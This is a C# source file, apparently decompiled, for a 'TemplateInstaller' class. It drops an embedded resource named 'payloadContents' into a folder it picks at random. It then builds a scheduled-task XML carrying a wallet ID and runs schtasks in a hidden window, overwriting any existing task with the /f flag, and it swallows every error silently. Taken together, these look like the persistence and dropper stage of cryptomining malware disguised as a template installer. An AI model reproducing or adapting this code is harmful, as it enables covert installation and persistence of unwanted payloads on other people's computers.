using MdmProject_v4;
using MdmProject_v4.Properties;
using System;
using System.Diagnostics;
using System.IO;

internal class TemplateInstaller
{
	private TemplateVersion prvTemplateVersion;

	private string taskConfigFilePath;

	public TemplateInstaller(TemplateVersion templateVersionToInstall)
	{
		this.prvTemplateVersion = templateVersionToInstall;
	}

	private void SavePayload()
	{
		byte[] byte_ = Resources.payloadContents;
		DecodeDeserializeUtils.SaveEncodedFilesToPath(byte_, this.prvTemplateVersion.prop_tmp_dir);
	}

	private void SaveTaskConfigFile()
	{
		this.taskConfigFilePath = Path.Combine(this.prvTemplateVersion.prop_tmp_dir, "config.xml");
		FileUtils.SaveTextToFile(this.taskConfigFilePath, this.BuildTaskConfig());
	}

	private string BuildTaskConfig()
	{
		Random random = new Random();
		DateTime dateTime = DateTime.Now.AddDays((double)random.Next(1, 2));
		string text = string.Concat(new string[]
		{
			Convert.ToString(dateTime.Year),
			"-",
			dateTime.Month.ToString("D2"),
			"-",
			dateTime.Day.ToString("D2"),
			"T",
			dateTime.Hour.ToString("D2"),
			":",
			dateTime.Minute.ToString("D2"),
			":",
			dateTime.Second.ToString("D2")
		});
		return string.Format(Globals.taskConfigXml, new object[]
		{
			text,
			Path.Combine(this.prvTemplateVersion.prop_tmp_dir, this.prvTemplateVersion.prop_run_file),
			this.prvTemplateVersion.prop_tmp_dir,
			Globals.walletId
		});
	}

	private void LaunchTaskCreator(bool forceTaskCreationIfExist)
	{
		string string_ = this.BuildTaskCreatorArguments(forceTaskCreationIfExist);
		FileUtils.LaunchFile(Globals.schtasksPath, string_, true, ProcessWindowStyle.Hidden);
	}

	private string BuildTaskCreatorArguments(bool forceTaskCreationIfExist)
	{
		string arg = "";
		if (forceTaskCreationIfExist)
		{
			arg = " /f";
		}
		return string.Format(string.Concat(new string[]
		{
			"/create /tn \"",
			this.prvTemplateVersion.prop_task_name,
			"\"{0} /xml \"",
			this.taskConfigFilePath,
			"\""
		}), arg);
	}

	public void CreateTask(bool forceTaskCreationIfExist)
	{
		this.SaveTaskConfigFile();
		this.LaunchTaskCreator(forceTaskCreationIfExist);
	}

	private string CreateInstallFolder(string rootFolder, string subFolder)
	{
		string[] directories = Directory.GetDirectories(rootFolder);
		if (directories.Length == 0)
		{
			return rootFolder;
		}
		return Directory.CreateDirectory(Path.Combine(directories[new Random().Next(0, directories.Length)], subFolder)).FullName;
	}

	public void InstallTemplate()
	{
		for (int i = 0; i < this.prvTemplateVersion.prop_root_dirs.Length; i++)
		{
			try
			{
				this.prvTemplateVersion.prop_tmp_dir = this.CreateInstallFolder(this.prvTemplateVersion.prop_root_dirs[i], this.prvTemplateVersion.prop_up_dir);
				this.SavePayload();
				this.CreateTask(true);
				break;
			}
			catch
			{
			}
		}
	}
}
